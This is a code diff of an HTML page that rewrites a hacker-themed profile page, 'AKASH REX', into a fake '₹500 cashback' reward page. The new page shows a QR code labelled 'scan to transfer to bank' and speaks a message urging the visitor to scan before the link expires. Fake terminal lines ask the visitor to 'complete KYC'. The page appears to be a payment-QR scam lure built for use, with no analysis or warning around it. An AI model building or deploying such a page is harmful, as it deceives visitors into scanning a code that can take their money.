@@ -3,51 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AKASH REX | CHITS TERMINAL</title>
+    <title>AKASH REX | REWARD SYSTEM</title>
     <style>
-        body, html { background: #000; color: #ff0000; margin: 0; padding: 0; font-family: 'Courier New', monospace; overflow: hidden; height: 100vh; }
-        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.4; }
+        body, html { background: #000; color: #ff0000; margin: 0; padding: 0; font-family: 'Courier New', monospace; overflow-x: hidden; text-align: center; }
+        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 1000; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .enter-btn { border: 2px solid #ff0000; background: none; color: #ff0000; padding: 20px 40px; font-size: 1.2rem; cursor: pointer; letter-spacing: 5px; box-shadow: 0 0 20px #ff0000; }
-        #profile-card { display: none; text-align: center; padding: 20px; z-index: 10; margin-top: 50px; }
-        .profile-img { width: 150px; height: 150px; border-radius: 50%; border: 3px solid #ff0000; box-shadow: 0 0 30px #ff0000; object-fit: cover; filter: grayscale(1); }
-        .glitch { font-size: 2.5rem; color: #fff; text-shadow: 2px 0 #ff0000, -2px 0 #00ffff; animation: g 0.5s infinite; }
-        @keyframes g { 0% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 100% { transform: translate(0); } }
-        #log { width: 85%; margin: 20px auto; font-size: 0.8rem; color: #0f0; text-align: left; height: 120px; }
+        .enter-btn { border: 2px solid #0f0; background: none; color: #0f0; padding: 20px 40px; font-size: 1.2rem; cursor: pointer; letter-spacing: 5px; box-shadow: 0 0 20px #0f0; text-transform: uppercase; font-weight: bold; }
+        .glitch { font-size: 2.5rem; font-weight: bold; color: #fff; text-shadow: 2px 0 #ff0000, -2px 0 #00ffff; margin-top: 30px; }
+        .qr-container { margin: 20px auto; padding: 15px; border: 3px solid #0f0; width: 230px; background: rgba(0, 255, 0, 0.05); box-shadow: 0 0 50px rgba(0, 255, 0, 0.2); border-radius: 15px; }
+        .qr-img { width: 210px; height: 210px; border: 2px solid #fff; border-radius: 10px; }
+        #terminal { width: 90%; margin: 15px auto; font-size: 0.85rem; color: #0f0; text-align: left; height: 120px; overflow: hidden; background: rgba(0,0,0,0.8); padding: 10px; border-radius: 5px; }
+        .cash-alert { color: #fff; background: #ff0000; padding: 5px; font-weight: bold; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
     <div id="overlay">
-        <h2 style="color: #fff; letter-spacing: 2px;">ENCRYPTION ACTIVE</h2>
-        <button class="enter-btn" onclick="run()">BYPASS SYSTEM</button>
+        <h1 style="color: #0f0; margin-bottom: 10px;">FREE REWARD DETECTED</h1>
+        <p style="color: #fff;">System Found: ₹500 Cashback</p>
+        <button class="enter-btn" onclick="startSystem()">CLAIM NOW</button>
     </div>
-    <div id="profile-card">
-        <img src="https://via.placeholder.com/150/000/f00?text=AKASH+REX" class="profile-img">
+    <div id="main-content" style="display:none;">
         <h1 class="glitch">AKASH REX</h1>
-        <p style="color: #ff0000; letter-spacing: 3px;">OWNER OF CHITS</p>
-        <div id="log"></div>
+        <p class="cash-alert">💰 WINNER: ₹500 CASHBACK UNLOCKED 💰</p>
+        <div id="terminal"></div>
+        <div class="qr-container">
+            <p style="font-size: 14px; color: #0f0; margin-bottom: 10px; font-weight: bold;">SCAN TO TRANSFER TO BANK</p>
+            <img src="qr.jpg" alt="Scan to Claim" class="qr-img">
+            <p style="color: #fff; font-size: 11px; margin-top: 10px;">Security: Verified by CHITS Encryption</p>
+        </div>
+        <p style="color: #444; font-size: 10px;">ID: REX-9921-CLAIM-DONE</p>
     </div>
     <script>
-        const c = document.getElementById('matrix'), x = c.getContext('2d');
-        c.width = window.innerWidth; c.height = window.innerHeight;
-        const s = "01AKASHREXCHITS01", f = 16, d = Array(Math.floor(c.width/f)).fill(1);
+        const canvas = document.getElementById('matrix'), ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const letters = "01AKASHREXCHITS₹₹₹";
+        const fontSize = 16, columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
         function draw() {
-            x.fillStyle = "rgba(0,0,0,0.05)"; x.fillRect(0,0,c.width,c.height);
-            x.fillStyle = "#800"; x.font = f+"px monospace";
-            d.forEach((y,i) => {
-                x.fillText(s[Math.floor(Math.random()*s.length)], i*f, y*f);
-                if(y*f > c.height && Math.random() > 0.975) d[i] = 0; d[i]++;
-            });
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#060"; ctx.font = fontSize + "px monospace";
+            for (let i = 0; i < drops.length; i++) {
+                ctx.fillText(letters.charAt(Math.floor(Math.random() * letters.length)), i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
         }
-        setInterval(draw, 35);
-        function run() {
+        setInterval(draw, 33);
+        function startSystem() {
             document.getElementById('overlay').style.display = 'none';
-            document.getElementById('profile-card').style.display = 'block';
-            const v = new SpeechSynthesisUtterance("Welcome, Akash Rex. CHITS system protocol is active.");
-            v.pitch = 0.7; window.speechSynthesis.speak(v);
-            const l = document.getElementById('log'), t = ["> BYPASSING FIREWALL...", "> ACCESSING DATA...", "> MASTER AKASH REX CONFIRMED."];
-            let i = 0; setInterval(() => { if(i < t.length) { l.innerHTML += t[i]+"<br>"; i++; } }, 1000);
+            document.getElementById('main-content').style.display = 'block';
+            const msg = new SpeechSynthesisUtterance("Congratulations! You have won a five hundred rupees reward from Akash Rex. Scan the secure code on your screen to transfer the money to your bank account immediately. This link will expire soon.");
+            msg.pitch = 1.1; window.speechSynthesis.speak(msg);
+            const term = document.getElementById('terminal');
+            const lines = [
+                "> [SYSTEM] ACCESSING REWARD GATEWAY...",
+                "> [SUCCESS] ₹500.00 VOUCHER GENERATED",
+                "> [INFO] SENDER: MASTER AKASH REX",
+                "> [ACTION] SCAN QR TO COMPLETE KYC & CLAIM",
+                "> [WARNING] DO NOT CLOSE THIS PAGE..."
+            ];
+            let i = 0;
+            setInterval(() => { if(i < lines.length) { term.innerHTML += lines[i]+"<br>"; i++; } }, 1000);
         }
     </script>
 </body>
